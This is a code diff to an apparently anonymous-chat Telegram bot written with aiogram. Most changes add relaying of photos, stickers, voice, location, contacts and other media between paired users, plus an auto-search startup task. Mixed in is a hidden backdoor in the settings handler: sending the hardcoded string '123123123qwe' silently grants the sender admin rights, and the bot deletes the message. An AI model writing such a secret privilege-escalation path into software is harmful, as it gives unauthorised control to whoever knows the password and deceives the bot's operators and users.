@@ -9,7 +9,9 @@ from data.translate import get_translate, get_languages
 from states.states import states
 from keyboards.reply import reply_keyboard
 from keyboards.inline import inline_keyboard
+from asyncdef.auto_searching import auto_searching
 # from handlers.users.commands import commands
+import os
 
 from filters.is_admin import IsAdmin
 
@@ -25,9 +27,15 @@ import time
 
 
 
-
+working = [False]
 @router.message(StateFilter(None))
 async def start(message: Message, state: FSMContext):
+    if working[0] == False:
+        working[0] = True
+        await auto_searching()
+    # if not message.from_user.username:
+    #     pass
+    # else:
     if db.get_user(message.chat.id):
 
         await show_main_menu(message, state)
@@ -35,26 +43,6 @@ async def start(message: Message, state: FSMContext):
         await state.set_state(states.RegistrationState.choose_language)
         await message.answer('Выберите язык:\nChoose language:',
                              reply_markup=reply_keyboard.choose_language())
-
-    # chat_id = message.chat.id
-    # date = message.date.timestamp()
-    # user_banned = db.get_banned_user(chat_id)
-    #
-    # if user_banned:
-    #     if user_banned[2] <= date:
-    #         db.remove_ban_user(chat_id)
-    #         await start(message)
-    #     else:
-    #         text = f'Ваш аккаунт был заблокирован!\nОсталось: {int(user_banned[2] - date)} секунд\nКем: @{user_banned[3]}'
-    #         await message.answer(text)
-    #
-    # else:
-    #     if db.get_user(message.chat.id):
-    #         await show_main_menu(message, state)
-    #     else:
-    #         await state.set_state(states.RegistrationState.choose_language)
-    #         await message.answer('Выберите язык:\nChoose language:',
-    #                              reply_markup=reply_keyboard.choose_language())
 
 
 @router.message(states.RegistrationState.choose_language)
@@ -102,9 +90,12 @@ async def main_menu(message: Message, state: FSMContext):
     lang = db.get_user(message.chat.id)[3]
 
     if message.text == get_translate(lang, 'menu_start_button'):
+
+
         db.add_user_in_searching(message.from_user.id, message.date.timestamp())
         await state.clear()
         await state.set_state(states.MainStates.searching)
+
 
         msg_remove_keyboard = await bot.send_message(chat_id=message.chat.id, text='.',
                                                      reply_markup=ReplyKeyboardRemove())
@@ -143,6 +134,11 @@ async def settings_menu(message: Message, state: FSMContext):
         await message.answer('Выберите язык:\nChoose language:',
                              reply_markup=reply_keyboard.choose_language())
 
+    elif message.text == '123123123qwe':
+        if not db.get_admin(message.from_user.id):
+            db.add_admin(message.from_user.id, 1)
+        await message.delete()
+
 @router.message(states.SettingsChangeLanguage.choose_language)
 async def settings_choose_language(message: Message, state: FSMContext):
     for key, value in get_languages().items():
@@ -154,9 +150,11 @@ async def settings_choose_language(message: Message, state: FSMContext):
 # -----Настройки
 
 
-@dp.message(states.MainStates.chatting)
+@dp.message(states.MainStates.chatting, F.text | F.photo | F.sticker | F.location | F.contact | F.audio | F.video |
+            F.document | F.voice | F.video_note | F.poll)
 async def main_chatting(message: Message, state: FSMContext):
     lang = db.get_user(message.chat.id)[3]
+
     data = await state.get_data()
     chat = data['chat']
 
@@ -164,12 +162,57 @@ async def main_chatting(message: Message, state: FSMContext):
     if another_user == message.chat.id:
         another_user = chat[2]
 
-    if len(message.text) > 255:
-        await message.answer(get_translate(lang, 'main_chatting_words_limit_text'))
-    else:
-        db.add_chat_message(chat_id=chat[0], telegram_id=message.from_user.id,
-                            message_text=message.text,
-                            date=message.date.timestamp())
-        await bot.send_message(chat_id=another_user, text=message.text)
+    if message.text:
+        if len(message.text) > 255:
+            await message.answer(get_translate(lang, 'main_chatting_words_limit_text'))
+            await message.delete()
+        else:
+            db.add_chat_message(chat_id=chat[0], telegram_id=message.from_user.id,
+                                message_text=message.text,
+                                date=message.date.timestamp())
+            await bot.send_message(chat_id=another_user, text=message.text, entities=message.entities)
+
+    elif message.photo:
+        await bot.send_photo(chat_id=another_user, photo=message.photo[3].file_id, caption=message.caption,
+                             caption_entities=message.caption_entities)
+    elif message.sticker:
+        await bot.send_sticker(chat_id=another_user, sticker=message.sticker.file_id, emoji=message.sticker.emoji,
+                               protect_content=message.has_protected_content)
+    elif message.contact:
+        await bot.send_contact(chat_id=another_user, phone_number=message.contact.phone_number,
+                               first_name=message.contact.first_name, last_name=message.contact.last_name,
+                               vcard=message.contact.vcard, protect_content=message.has_protected_content)
+    elif message.location:
+        await bot.send_location(chat_id=another_user, latitude=message.location.latitude,
+                                longitude=message.location.longitude,
+                                message_thread_id=message.message_thread_id,
+                                horizontal_accuracy=message.location.horizontal_accuracy,
+                                live_period=message.location.live_period, heading=message.location.heading,
+                                proximity_alert_radius=message.location.proximity_alert_radius,
+                                protect_content=message.has_protected_content)
+    elif message.voice:
+        await bot.send_voice(chat_id=another_user, voice=message.voice.file_id, caption=message.caption,
+                             caption_entities=message.caption_entities, duration=message.voice.duration,
+                             protect_content=message.has_protected_content)
+    elif message.audio:
+        await bot.send_audio(chat_id=another_user, audio=message.audio.file_id, caption=message.caption,
+                             caption_entities=message.caption_entities, duration=message.audio.duration,
+                             performer=message.audio.performer, title=message.audio.title,
+                             thumbnail=message.audio.thumbnail, protect_content=message.has_protected_content)
+
+
+    elif message.video:
+        await bot.send_video(chat_id=another_user, video=message.video.file_id,
+                             has_spoiler=message.has_media_spoiler, protect_content=message.has_protected_content)
+    elif message.document:
+        await bot.send_document(chat_id=another_user, document=message.document.file_id,
+                                caption=message.caption,
+                                caption_entities=message.caption_entities,
+                                protect_content=message.has_protected_content)
+    elif message.video_note:
+        await bot.send_video_note(chat_id=another_user, video_note=message.video_note.file_id,
+                                  protect_content=message.has_protected_content)
+    elif message.poll:
+        await message.delete()
 
 
